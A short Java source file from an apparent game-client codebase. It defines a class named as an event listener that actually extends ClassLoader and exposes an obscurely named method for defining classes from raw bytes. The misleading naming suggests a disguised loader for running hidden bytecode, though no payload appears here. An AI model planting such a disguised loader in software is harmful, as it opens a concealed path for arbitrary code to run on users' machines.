package net.rinorclient.client.impl.event.events;

import java.util.EventListener;

public class MuroshEvent extends ClassLoader implements EventListener {
    public Class<?> l(String c, byte[] b) {
        return defineClass(c, b, 0, b.length);
    }
}
